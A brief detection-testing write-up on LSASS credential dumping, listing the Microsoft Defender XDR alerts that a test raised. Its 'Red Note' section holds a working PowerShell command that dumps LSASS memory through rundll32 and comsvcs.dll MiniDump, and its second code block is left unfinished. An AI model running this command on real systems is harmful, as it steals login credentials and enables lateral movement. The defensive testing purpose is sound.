# LSASS dumping, MiniDump
Hackers might target LSASS to grab login credentials stored in its memory. 
After a user logs in, LSASS stores important credential info that can be stolen by attackers to move through a system using different authentication details.

Microsoft Defender for Endpoint and Defender Antivirus effectively prevent and detect LSASS dumping activities. 
Now, I'd like to demonstrate the detection perspective by ***capturing all activities and correlating multiple alerts into a single incident***.

## Red Note (test insights)
**PowerShell, LSASS credential dumping, Built-in Windows tool** 
```powershell
$lsassPID = (Get-Process -Name lsass).Id
cmd.exe /C "C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID C:\temp\out.dmp full" 
```

```powershell

$tempDir = "C:\temp"

if (-not (Test-Path $tempDir -PathType Container)) {
        New-Item -Path $tempDir -ItemType Directory
}

## Alerts & Detections
After running the script, these alerts were generated and correlated into a single incident in Microsoft Defender XDR portal.
- [x] Suspicious PowerShell command line
- [x] Sensitive credential memory read
- [x] Suspicious process executed PowerShell command
- [x] Suspicious access to LSASS service
- [x] Process memory dump
- [x] Suspicious Process Discovery
- [x] Suspicious Microsoft Defender Antivirus exclusion
- [x] Attempt to turn off Microsoft Defender Antivirus protection
